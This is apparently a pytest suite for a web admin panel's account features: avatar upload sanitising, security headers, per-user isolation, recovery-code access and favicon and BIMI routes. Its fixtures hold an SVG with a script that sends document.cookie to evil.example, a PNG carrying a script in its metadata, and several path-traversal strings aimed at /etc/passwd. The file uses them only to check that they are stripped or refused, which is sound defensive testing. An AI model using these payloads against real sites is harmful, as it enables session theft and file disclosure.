"""The account page, over real HTTP.

identity.py is tested on its own for what it does to a file. These tests are
about what the panel does with the result: who may write it, who may read it,
what headers it goes out under, and which cards each kind of account is shown.
"""
import struct
import zlib

import pytest

import DB
import identity
import panel
import panel_users as pu
from fastapi.testclient import TestClient

STAFF = "pytest_acct_user"
OTHER = "pytest_acct_other"
PASSWORD = "Acc0unt!Pass"

SVG_WITH_SCRIPT = (b'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32">'
                   b'<script>fetch("//evil.example/"+document.cookie)</script>'
                   b'<rect width="32" height="32" onload="alert(1)" fill="#bd5b3d"/></svg>')


def _png():
    def chunk(kind, data):
        return (struct.pack(">I", len(data)) + kind + data
                + struct.pack(">I", zlib.crc32(kind + data) & 0xFFFFFFFF))
    ihdr = struct.pack(">IIBBBBB", 8, 8, 8, 6, 0, 0, 0)
    body = zlib.compress(b"\x00" + b"\xff" * 32 * 8)
    return (identity._PNG_MAGIC + chunk(b"IHDR", ihdr)
            + chunk(b"tEXt", b"Comment\x00<script>alert(1)</script>")
            + chunk(b"IDAT", body) + chunk(b"IEND", b""))


@pytest.fixture(scope="module")
def client():
    with TestClient(panel.app, client=("127.0.0.1", 51031)) as c:
        yield c


@pytest.fixture(scope="module", autouse=True)
def accounts(db):
    conn = db.get_connection()
    identity.ensure_schema(conn)
    cur = conn.cursor()
    for name in (STAFF, OTHER):
        pu.delete_user(conn, name)
        pu.create_user(conn, name, PASSWORD, {}, "admin")
        panel._forget_user_epoch(name)
        cur.execute("DELETE FROM panel_identity WHERE username = %s", (name,))
    conn.commit()
    yield
    cur.execute("DELETE FROM panel_identity WHERE username IN (%s, %s)", (STAFF, OTHER))
    for name in (STAFF, OTHER):
        pu.delete_user(conn, name)
    conn.commit()
    cur.close()
    db.release_connection(conn)


def as_user(client, name):
    client.cookies.clear()
    client.cookies.set("session", panel._create_session_token(name))


# --- what comes back out of an upload --------------------------------------- #

def test_an_uploaded_svg_is_served_back_without_its_script(client):
    as_user(client, STAFF)
    r = client.post("/api/account/avatar", content=SVG_WITH_SCRIPT,
                    headers={"Content-Type": "image/svg+xml"})
    assert r.status_code == 200, r.text
    served = client.get(f"/api/account/avatar/{STAFF}")
    assert served.status_code == 200
    assert b"script" not in served.content
    assert b"onload" not in served.content
    assert b"evil.example" not in served.content
    assert b"<rect" in served.content


def test_a_png_is_served_back_without_its_metadata(client):
    as_user(client, STAFF)
    assert client.post("/api/account/avatar", content=_png(),
                       headers={"Content-Type": "image/png"}).status_code == 200
    served = client.get(f"/api/account/avatar/{STAFF}")
    assert served.headers["content-type"] == "image/png"
    assert b"tEXt" not in served.content and b"script" not in served.content


def test_an_avatar_keeps_its_own_strict_policy(client):
    """The app-wide middleware used to overwrite this with the page policy, which
    allows inline script from the same origin. An uploaded file must not be
    served under the policy written for the panel's own pages."""
    as_user(client, STAFF)
    client.post("/api/account/avatar", content=SVG_WITH_SCRIPT,
                headers={"Content-Type": "image/svg+xml"})
    r = client.get(f"/api/account/avatar/{STAFF}")
    csp = r.headers["content-security-policy"]
    assert "default-src 'none'" in csp
    assert "script-src 'self'" not in csp
    assert "sandbox" in csp
    assert r.headers["x-content-type-options"] == "nosniff"


def test_a_file_that_is_neither_format_is_refused(client):
    as_user(client, STAFF)
    r = client.post("/api/account/avatar", content=b"GIF89a" + b"\x00" * 64,
                    headers={"Content-Type": "image/png"})
    assert r.status_code == 400
    assert "PNG and SVG" in r.json()["error"]


def test_an_oversized_upload_is_refused_by_size_alone(client):
    as_user(client, STAFF)
    r = client.post("/api/account/avatar",
                    content=b"\x89PNG\r\n\x1a\n" + b"x" * identity.MAX_UPLOAD,
                    headers={"Content-Type": "image/png"})
    assert r.status_code == 413


# --- whose account is it ---------------------------------------------------- #

def test_an_upload_only_ever_changes_your_own_picture(client):
    """There is deliberately no username on the write path: the session decides
    whose row is written, so there is nothing to tamper with."""
    as_user(client, STAFF)
    client.post("/api/account/avatar", content=_png(),
                headers={"Content-Type": "image/png"})
    as_user(client, OTHER)
    client.post("/api/account/avatar", content=SVG_WITH_SCRIPT,
                headers={"Content-Type": "image/svg+xml"})
    mine = client.get(f"/api/account/avatar/{OTHER}").content
    theirs = client.get(f"/api/account/avatar/{STAFF}").content
    assert mine != theirs
    assert theirs.startswith(identity._PNG_MAGIC), "STAFF's PNG was replaced"


def test_a_name_change_only_ever_changes_your_own(client):
    as_user(client, STAFF)
    client.post("/api/account/name", json={"full_name": "Staff Person"})
    as_user(client, OTHER)
    assert client.get("/api/account/identity").json()["full_name"] != "Staff Person"


def test_an_avatar_needs_a_session(client):
    client.cookies.clear()
    r = client.get(f"/api/account/avatar/{STAFF}", follow_redirects=False)
    assert r.status_code == 401


def test_a_username_that_is_a_path_is_refused(client):
    as_user(client, STAFF)
    assert client.get("/api/account/avatar/..%2f..%2fetc%2fpasswd").status_code in (400, 404)


# --- recovery codes are the admin's alone ----------------------------------- #

def test_staff_cannot_read_or_mint_recovery_codes(client):
    as_user(client, STAFF)
    assert client.get("/api/account/recovery-status").status_code == 403
    assert client.post("/api/account/recovery-codes",
                       json={"current_password": PASSWORD}).status_code == 403


def test_the_staff_account_page_has_no_recovery_card_at_all(client):
    """Not a disabled card, not an error when it loads: it is not on the page.
    What is there instead is who to ask."""
    as_user(client, STAFF)
    page = client.get("/dashboard").text
    assert "Recovery codes" not in page
    assert "ask an administrator" in page.lower()


def test_the_admin_account_page_still_has_it(client):
    as_user(client, "admin")
    assert "Recovery codes" in client.get("/dashboard").text


# --- a staff member can change their own password --------------------------- #

def test_a_staff_member_can_change_their_own_password(client, db):
    """This endpoint checked the admin table and nothing else, so the password
    form on a staff account page could never succeed."""
    as_user(client, STAFF)
    wrong = client.post("/api/account/password",
                        json={"current_password": "nope", "new_password": "N3wAcct!pass"})
    assert wrong.status_code == 403
    ok = client.post("/api/account/password",
                     json={"current_password": PASSWORD, "new_password": "N3wAcct!pass"})
    assert ok.status_code == 200, ok.text
    conn = db.get_connection()
    try:
        assert pu.verify_login(conn, STAFF, "N3wAcct!pass")
        assert pu.verify_login(conn, STAFF, PASSWORD) is None
        # Put it back so the ordering of tests in this file cannot matter.
        pu.update_user(conn, STAFF, password=PASSWORD)
    finally:
        db.release_connection(conn)
    panel._forget_user_epoch(STAFF)


# --- the mark in the tab ---------------------------------------------------- #

def test_the_favicon_is_served_without_a_session(client):
    """A browser asks for it before it has one, and it is the panel's badge, not
    anybody's data."""
    client.cookies.clear()
    r = client.get("/favicon.ico")
    assert r.status_code == 200
    assert r.headers["content-type"] in ("image/svg+xml", "image/png")
    assert len(r.content) > 100


def test_the_favicon_is_the_recon_mark_that_ships_with_the_panel(client):
    """It is a file in the repository, not something fetched or stored. There is
    nothing to configure, which is why there is no endpoint to configure it."""
    import branding
    client.cookies.clear()
    served = client.get("/favicon.ico").content
    with open(branding._ASSET, "rb") as fh:
        assert served == fh.read()
    assert b"<svg" in served
    for route in [r.path for r in panel.app.routes if hasattr(r, "path")]:
        assert "brand" not in route, f"{route} still exists"


def test_the_favicon_is_cached_hard_and_answers_a_conditional_request(client):
    client.cookies.clear()
    first = client.get("/favicon.ico")
    assert "max-age" in first.headers["cache-control"]
    again = client.get("/favicon.ico",
                       headers={"If-None-Match": first.headers["etag"]})
    assert again.status_code == 304


def test_the_page_asks_for_the_favicon(client):
    as_user(client, "admin")
    assert 'rel="icon"' in client.get("/dashboard").text
    client.cookies.clear()
    assert 'rel="icon"' in client.get("/login").text


# --- bimi ------------------------------------------------------------------- #

def test_no_bimi_logo_is_published_for_an_account_with_no_mailbox(client):
    """The logo endpoint is open, so what it will serve has to be narrow: only
    accounts that already publish an address on the mail domain."""
    client.cookies.clear()
    assert client.get(f"/bimi/{STAFF}.svg").status_code == 404


def test_the_bimi_path_cannot_be_used_to_reach_anything_else(client):
    client.cookies.clear()
    for name in ("..%2f..%2fetc%2fpasswd", "admin%00", "a" * 300):
        assert client.get(f"/bimi/{name}.svg").status_code in (400, 404)


# --- the top bar ------------------------------------------------------------ #

def test_the_top_bar_shows_the_picture_as_an_image_never_inlined(client):
    """An SVG in an <img> cannot run script. The same bytes written into the page
    could, so the markup must always be a reference and never the file."""
    as_user(client, OTHER)
    client.post("/api/account/avatar", content=SVG_WITH_SCRIPT,
                headers={"Content-Type": "image/svg+xml"})
    page = client.get("/dashboard").text
    assert f"/api/account/avatar/{OTHER}" in page
    assert "<script>fetch" not in page
    assert 'class="acct-face"' in page


def test_the_top_bar_shows_the_name_and_the_role(client):
    as_user(client, OTHER)
    client.post("/api/account/name", json={"full_name": "Other Person"})
    page = client.get("/dashboard").text
    assert "Other Person" in page
    assert "Staff" in page
    as_user(client, "admin")
    assert "Administrator" in client.get("/dashboard").text
